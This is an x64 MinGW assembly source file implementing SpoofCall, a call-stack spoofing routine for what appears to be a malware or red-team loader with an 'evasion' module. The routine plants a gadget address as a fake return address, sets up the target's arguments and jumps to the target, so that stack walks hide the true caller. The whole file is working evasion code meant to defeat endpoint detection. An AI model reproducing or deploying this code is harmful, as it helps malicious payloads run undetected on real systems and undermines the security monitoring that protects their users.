/*
 * callstack_spoof_gas.S — x64 MinGW port of callstack_spoof.asm (MASM).
 *
 * Provides SpoofCall(SpoofContext* ctx). Semantics, stack layout, and
 * register usage mirror the MASM source 1:1; see callstack_spoof.asm
 * for the stack diagram and alignment notes. Only this file is linked
 * when the Loader is built with MinGW (CONFIG_CALLSTACK_SPOOF_ENABLED=1).
 *
 * GAS-specific notes:
 *   - `.intel_syntax noprefix` lets the body stay close to the MASM
 *     original; operand size for memory moves is inferred from the
 *     register, so no `QWORD PTR` annotations are needed.
 *   - Win64 symbols are plain C names (no underscore prefix), matching
 *     the `extern "C" ULONG_PTR SpoofCall(SpoofContext*)` decl in
 *     include/evasion/callstack_spoof.hpp.
 *   - `.seh_proc` / `.seh_endproc` frame a naked function for SEH so
 *     RtlVirtualUnwind over our frame doesn't trip. No prologue ops
 *     are emitted inside; the unwind info is intentionally empty.
 */

    .intel_syntax noprefix
    .text

    .globl  SpoofCall
    .def    SpoofCall;  .scl 2;  .type 32;  .endef
    .seh_proc SpoofCall
SpoofCall:
    /* rcx = SpoofContext*;  [rsp+0] = real_return_addr */

    mov     rax,  [rcx]               /* rax = Target  */
    mov     r10,  [rcx + 8]           /* r10 = Gadget  */
    mov     r11,  rcx                 /* r11 = context */

    /* Extend the stack by 112 bytes; real_return_addr now at [rsp+112]. */
    sub     rsp, 112

    /* [rsp+0] = Gadget (fake return addr);  [rsp+104] = Target (temp slot). */
    mov     [rsp],       r10
    mov     [rsp + 104], rax

    /* Zero shadow space [rsp+8..32]. */
    xor     r10, r10
    mov     [rsp +  8],  r10
    mov     [rsp + 16],  r10
    mov     [rsp + 24],  r10
    mov     [rsp + 32],  r10

    /* Zero stack-arg slots [rsp+40..96]. */
    mov     [rsp + 40],  r10
    mov     [rsp + 48],  r10
    mov     [rsp + 56],  r10
    mov     [rsp + 64],  r10
    mov     [rsp + 72],  r10
    mov     [rsp + 80],  r10
    mov     [rsp + 88],  r10
    mov     [rsp + 96],  r10

    /* Selectively copy StackArgs[0..StackArgCount-1] into slots. */
    mov     r10d, dword ptr [r11 + 112]
    test    r10d, r10d
    jz      .Largs_done

    mov     rax,  [r11 + 48]
    mov     [rsp + 40],  rax
    cmp     r10d, 2
    jb      .Largs_done

    mov     rax,  [r11 + 56]
    mov     [rsp + 48],  rax
    cmp     r10d, 3
    jb      .Largs_done

    mov     rax,  [r11 + 64]
    mov     [rsp + 56],  rax
    cmp     r10d, 4
    jb      .Largs_done

    mov     rax,  [r11 + 72]
    mov     [rsp + 64],  rax
    cmp     r10d, 5
    jb      .Largs_done

    mov     rax,  [r11 + 80]
    mov     [rsp + 72],  rax
    cmp     r10d, 6
    jb      .Largs_done

    mov     rax,  [r11 + 88]
    mov     [rsp + 80],  rax
    cmp     r10d, 7
    jb      .Largs_done

    mov     rax,  [r11 + 96]
    mov     [rsp + 88],  rax
    cmp     r10d, 8
    jb      .Largs_done

    mov     rax,  [r11 + 104]
    mov     [rsp + 96],  rax

.Largs_done:
    /* Load register args for Target; clobber rcx last to preserve r11. */
    mov     rcx,  [r11 + 16]          /* Arg1 */
    mov     rdx,  [r11 + 24]          /* Arg2 */
    mov     r8,   [r11 + 32]          /* Arg3 */
    mov     r9,   [r11 + 40]          /* Arg4 */

    /* Reload Target and jump. Target sees [rsp+0] = Gadget as return addr;
       Gadget's `add rsp, 0x68; ret` then returns to the real caller. */
    mov     rax,  [rsp + 104]
    jmp     rax

    .seh_endproc
